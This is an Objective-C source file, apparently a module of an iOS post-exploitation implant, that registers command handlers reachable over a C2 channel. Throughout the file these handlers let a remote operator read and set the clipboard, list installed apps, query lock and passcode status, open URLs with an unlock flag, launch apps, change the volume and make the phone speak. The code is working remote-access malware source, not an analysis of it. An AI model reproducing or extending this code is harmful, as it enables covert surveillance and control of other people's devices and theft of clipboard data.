/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _UI_H_
#define _UI_H_

#import <objc/runtime.h>
#import <AVFoundation/AVFoundation.h>
#import <MediaPlayer/MediaPlayer.h>
#import <CoreFoundation/CoreFoundation.h>

#include <mach/port.h>

#include <api.h>
#include <c2.h>
#include <tlv.h>
#include <tlv_types.h>

#define CLIPBOARD_MAX 65535

#define UI_BASE 6

#define UI_CLIPBOARD_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL)
#define UI_CLIPBOARD_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 1)
#define UI_SAY \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 5)
#define UI_OPEN_URL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 6)
#define UI_OPEN_APP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 7)
#define UI_SBINFO \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 8)
#define UI_APP_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 9)
#define UI_VOLUME_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 10)
#define UI_VOLUME_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL + 11)

#define TLV_TYPE_LOCKED   TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE)
#define TLV_TYPE_PASSCODE TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE + 1)

mach_port_t SBSSpringBoardServerPort();
void SBGetScreenLockStatus(mach_port_t port, BOOL *lockStatus, BOOL *passcodeEnabled);
int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
int SBSOpenSensitiveURLAndUnlock(CFURLRef url, char flags);

@interface AVSystemController : NSObject
+(instancetype)sharedAVSystemController;
-(BOOL)setVolumeTo:(float)volume forCategory:(id)category;
-(BOOL)getVolume:(float *)volume forCategory:(id)category;
@end

static tlv_pkt_t *ui_say(c2_t *c2)
{
    char phrase[1024];

    AVSpeechSynthesizer *synthesizer;
    AVSpeechUtterance* utterance;

    NSDictionary *languageDic;

    NSString *phraseSay;
    NSString *language;
    NSString *countryCode;
    NSString *languageCode;
    NSString *languageForVoice;

    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, phrase);

    @autoreleasepool
    {
        phraseSay = [NSString stringWithUTF8String:phrase];

        synthesizer = [[AVSpeechSynthesizer alloc] init];
        utterance = [AVSpeechUtterance speechUtteranceWithString:phraseSay];

        utterance.rate = 0.5;

        language = [[NSLocale currentLocale] localeIdentifier];
        languageDic = [NSLocale componentsFromLocaleIdentifier:language];
        countryCode = [languageDic objectForKey:NSLocaleCountryCode];
        languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
        languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];

        utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
        [synthesizer speakUtterance:utterance];
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *ui_app_list(c2_t *c2)
{
    tlv_pkt_t *result;
    NSMutableArray *bundleIDs;
    NSString *bundleID;
    NSObject *workspace;
    NSObject *app;
    NSArray *apps;
    Class LSApplicationWorkspace_class;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
    workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
    apps = [workspace performSelector:@selector(allApplications)];

    for (app in apps)
    {
        NSString *bundleID = [app performSelector:@selector(applicationIdentifier)];
        tlv_pkt_add_string(result, TLV_TYPE_STRING, (char *)[bundleID UTF8String]);
    }

    return result;
}

static tlv_pkt_t *ui_open_url(c2_t *c2)
{
    char url[4096];
    NSURL *urlLink;
    CFURLRef finalURL;

    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, url);

    urlLink = [NSURL URLWithString:[NSString stringWithUTF8String:url]];
    finalURL = (__bridge CFURLRef)urlLink;

    SBSOpenSensitiveURLAndUnlock(finalURL, 1);
    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *ui_open_app(c2_t *c2)
{
    char bundle_id[128];
    mach_port_t port;
    CFStringRef bundleID;

    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, bundle_id);
    bundleID = (__bridge CFStringRef)[NSString stringWithUTF8String:bundle_id];

    if (SBSLaunchApplicationWithIdentifier(bundleID, 0))
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *ui_sbinfo(c2_t *c2)
{
    BOOL locked;
    BOOL passcode;
    mach_port_t port;
    tlv_pkt_t *result;

    port = SBSSpringBoardServerPort();
    SBGetScreenLockStatus(port, &locked, &passcode);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    tlv_pkt_add_int(result, TLV_TYPE_LOCKED, locked ? 1 : 0);
    tlv_pkt_add_int(result, TLV_TYPE_PASSCODE, passcode ? 1 : 0);

    return result;
}

static tlv_pkt_t *ui_volume_set(c2_t *c2)
{
    int value;
    float delta;

    AVSystemController *controller;

    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &value);
    delta = value * 0.1;

    controller = [NSClassFromString(@"AVSystemController") sharedAVSystemController];

    if (![controller setVolumeTo:delta forCategory:@"Audio/Video"])
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *ui_volume_get(c2_t *c2)
{
    int value;
    float delta;
    tlv_pkt_t *result;

    AVSystemController *controller;

    controller = [NSClassFromString(@"AVSystemController") sharedAVSystemController];

    if (![controller getVolume:&delta forCategory:@"Audio/Video"])
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    value = delta * 10;
    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
    tlv_pkt_add_int(result, TLV_TYPE_INT, value);

    return result;
}

static tlv_pkt_t *ui_clipboard_set(c2_t *c2)
{
    char text[CLIPBOARD_MAX];
    NSString *clipboardText;
    UIPasteboard *pasteboard;

    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, text);

    clipboardText = [NSString stringWithUTF8String:text];
    pasteboard = [NSClassFromString(@"UIPasteboard") generalPasteboard];
    [pasteboard setValue:clipboardText forPasteboardType:@"public.plain-text"];

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *ui_clipboard_get(c2_t *c2)
{
    tlv_pkt_t *result;
    UIPasteboard *pasteboard;
    char *text;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    pasteboard = [NSClassFromString(@"UIPasteboard") generalPasteboard];
    text = (char *)[pasteboard.string UTF8String];

    if (text != NULL)
    {
        tlv_pkt_add_string(result, TLV_TYPE_STRING, text);
    }

    return result;
}

void register_ui_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, UI_CLIPBOARD_SET, ui_clipboard_set);
    api_call_register(api_calls, UI_CLIPBOARD_GET, ui_clipboard_get);
    api_call_register(api_calls, UI_SAY, ui_say);
    api_call_register(api_calls, UI_OPEN_URL, ui_open_url);
    api_call_register(api_calls, UI_OPEN_APP, ui_open_app);
    api_call_register(api_calls, UI_SBINFO, ui_sbinfo);
    api_call_register(api_calls, UI_APP_LIST, ui_app_list);
    api_call_register(api_calls, UI_VOLUME_SET, ui_volume_set);
    api_call_register(api_calls, UI_VOLUME_GET, ui_volume_get);
}

#endif